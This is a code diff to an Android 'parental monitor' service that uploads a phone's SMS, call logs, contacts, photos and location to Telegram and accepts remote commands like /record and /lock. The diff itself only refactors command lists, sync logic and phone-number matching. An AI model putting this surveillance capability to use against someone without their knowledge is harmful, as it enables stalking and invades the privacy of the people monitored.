@@ -104,7 +104,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
+        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/ping")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -1387,7 +1387,6 @@ class MonitoringService : Service() {
                     sendToTelegram(
                         buildString {
                             appendLine("🤖 <b>Commands</b>")
-                            appendLine("/ping - check delay")
                             appendLine("/help - show this list")
                         }
                     )
@@ -1579,7 +1578,15 @@ class MonitoringService : Service() {
             val allCalls = callLogRepository.getAllCalls(100)
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")
 
-            // Send start message
+            val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
+            val pendingSms = allSms.filter { it.id > entrySmsId }.sortedBy { it.id }
+            val entryCallTs = try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L }
+            val entryCallId = try { preferencesManager.lastCallId } catch (_: Exception) { 0L }
+            val pendingCalls = allCalls.filter { it.date > entryCallTs || (it.date == entryCallTs && it.id > entryCallId) }.sortedWith(compareBy({ it.date }, { it.id }))
+            if (pendingSms.isEmpty() && pendingCalls.isEmpty()) {
+                preferencesManager.initialSyncDone = true
+                return
+            }
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
             val startMessage = buildString {
                 appendLine("📱 <b>Monitoring started</b>")
@@ -1596,8 +1603,6 @@ class MonitoringService : Service() {
             delay(500)
             var initialOk = true
 
-            val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
-            val pendingSms = allSms.filter { it.id > entrySmsId }.sortedBy { it.id }
             if (pendingSms.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingSms.size} SMS...")
                 val smsTotal = pendingSms.size
@@ -1628,9 +1633,6 @@ class MonitoringService : Service() {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
             }
 
-            val entryCallTs = try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L }
-            val entryCallId = try { preferencesManager.lastCallId } catch (_: Exception) { 0L }
-            val pendingCalls = allCalls.filter { it.date > entryCallTs || (it.date == entryCallTs && it.id > entryCallId) }.sortedWith(compareBy({ it.date }, { it.id }))
             if (pendingCalls.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingCalls.size} calls...")
                 val callTotal = pendingCalls.size
@@ -1756,18 +1758,27 @@ class MonitoringService : Service() {
         if (normalized == want) return true
         if (normalized.length < 7 || want.length < 7) return false
         if (normalized.endsWith(want) || want.endsWith(normalized)) return true
-        for (a in idVariants(normalized)) {
-            for (b in idVariants(want)) {
-                if (a.endsWith(b) || b.endsWith(a)) return true
-            }
-        }
+        return numbersEqualFast(normalized, want, altVariant(want))
+    }
+
+    private fun altVariant(digits: String): String? {
+        if (digits.isEmpty()) return null
+        if (digits.startsWith("628") && digits.length in 10..15) return "0" + digits.substring(2)
+        if (digits.startsWith("08") && digits.length in 10..14) return "62" + digits.substring(1)
+        return null
+    }
+
+    private fun numbersEqualFast(have: String, want: String, wantAlt: String?): Boolean {
+        if (wantAlt != null && (have == wantAlt || have.endsWith(wantAlt) || wantAlt.endsWith(have))) return true
+        val haveAlt = altVariant(have) ?: return false
+        if (haveAlt == want || haveAlt.endsWith(want) || want.endsWith(haveAlt)) return true
+        if (wantAlt != null && (haveAlt == wantAlt || haveAlt.endsWith(wantAlt) || wantAlt.endsWith(haveAlt))) return true
         return false
     }
 
     private fun idVariants(digits: String): List<String> {
-        if (digits.isEmpty()) return emptyList()
-        val alt = if (digits.startsWith("62") && digits.length > 10) "0" + digits.substring(2) else if (digits.startsWith("0") && digits.length > 1) "62" + digits.substring(1) else digits
-        return if (alt == digits) listOf(digits) else listOf(digits, alt)
+        val alt = altVariant(digits) ?: return if (digits.isEmpty()) emptyList() else listOf(digits)
+        return listOf(digits, alt)
     }
 
 
